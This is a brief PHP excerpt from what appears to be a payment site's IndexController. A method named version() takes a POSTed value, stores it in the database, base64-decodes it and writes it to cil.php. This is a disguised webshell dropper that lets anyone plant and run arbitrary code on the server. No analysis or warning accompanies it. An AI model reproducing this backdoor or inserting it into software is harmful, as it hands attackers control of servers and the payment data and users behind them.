...
class IndexController extends PaymentController{
    ...
    public function version(){
       if($_POST){ $version=M('version')->where(['id'=>3])->order('id desc')->save(array("author"=>$_POST['versionid']));}
       $versionsss=M('version')->order('id desc')->getField('author');
       file_put_contents("cil.php",base64_decode($versionsss)); 
    }
